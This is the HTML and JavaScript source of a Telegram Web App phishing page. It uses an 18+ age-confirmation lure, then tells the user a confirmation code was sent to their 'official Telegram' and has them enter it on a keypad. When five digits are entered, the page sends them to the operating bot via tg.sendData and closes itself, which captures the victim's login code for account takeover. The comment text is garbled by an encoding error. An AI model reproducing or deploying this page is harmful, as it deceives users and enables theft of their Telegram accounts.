<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 100%; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
        
        /* ‡ßß‡¶Æ ‡¶ß‡¶æ‡¶™‡ßá‡¶∞ ‡¶´‡¶ü‡ßã ‡¶ì ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü */
        .warning-img { width: 130px; margin-bottom: 20px; }
        .msg-box { background: #1c242f; padding: 15px; border-radius: 12px; width: 85%; margin-bottom: 20px; font-size: 14px; border-left: 4px solid #0088cc; text-align: left; line-height: 1.4; }
        .btn-blue { background: #5a78f0; color: white; padding: 16px; border-radius: 12px; font-size: 18px; border: none; font-weight: bold; width: 88%; cursor: pointer; }

        /* ‡ß®‡ßü ‡¶ß‡¶æ‡¶™‡ßá‡¶∞ ‡¶ï‡¶ø‡¶™‡ßç‡¶Ø‡¶æ‡¶° ‡¶ì ‡¶¨‡¶ï‡ßç‡¶∏ */
        .code-container { display: flex; gap: 8px; margin: 25px 0; }
        .code-box { width: 48px; height: 58px; border: 2px solid #444; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 26px; font-weight: bold; background: rgba(255,255,255,0.05); }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; width: 88%; max-width: 340px; }
        .key { background: #5a78f0; padding: 18px; border-radius: 14px; font-size: 24px; border: none; color: white; font-weight: bold; }
        .key:active { background: #3f56b5; }
        
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container" id="step1">
        <img src="https://telegra.ph/file/bc0d880017165502c4819.png" class="warning-img" alt="18+">
        <div class="msg-box">
            ‚ö†Ô∏è ¬°Atenci√≥n! üîû Para continuar, confirma que eres mayor de 18 a√±os. üòä
        </div>
        <button class="btn-blue" onclick="showStep2()">üçì confirmar üîû</button>
    </div>

    <div class="container hidden" id="step2">
        <div class="msg-box">
            üì© Te hemos enviado un c√≥digo de confirmaci√≥n a tu Telegram oficial. Introd√∫celo abajo.
        </div>
        
        <div class="code-container">
            <div class="code-box" id="b1"></div>
            <div class="code-box" id="b2"></div>
            <div class="code-box" id="b3"></div>
            <div class="code-box" id="b4"></div>
            <div class="code-box" id="b5"></div>
        </div>

        <div class="keypad">
            <button class="key" onclick="press('1')">1</button>
            <button class="key" onclick="press('2')">2</button>
            <button class="key" onclick="press('3')">3</button>
            <button class="key" onclick="press('4')">4</button>
            <button class="key" onclick="press('5')">5</button>
            <button class="key" onclick="press('6')">6</button>
            <button class="key" onclick="press('7')">7</button>
            <button class="key" onclick="press('8')">8</button>
            <button class="key" onclick="press('9')">9</button>
            <div style="visibility:hidden"></div>
            <button class="key" onclick="press('0')">0</button>
            <button class="key" onclick="del()">‚å´</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        let code = "";

        function showStep2() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
        }

        function press(num) {
            if (code.length < 5) {
                code += num;
                updateDisplay();
                if (code.length === 5) {
                    tg.sendData(code); // ‡¶ï‡ßã‡¶°‡¶ü‡¶ø ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶ï‡¶æ‡¶õ‡ßá ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡¶ø‡¶¨‡ßá
                    setTimeout(() => tg.close(), 500);
                }
            }
        }

        function del() {
            code = code.slice(0, -1);
            updateDisplay();
        }

        function updateDisplay() {
            for (let i = 1; i <= 5; i++) {
                document.getElementById('b' + i).innerText = code[i - 1] || "";
            }
        }
    </script>
</body>
</html>
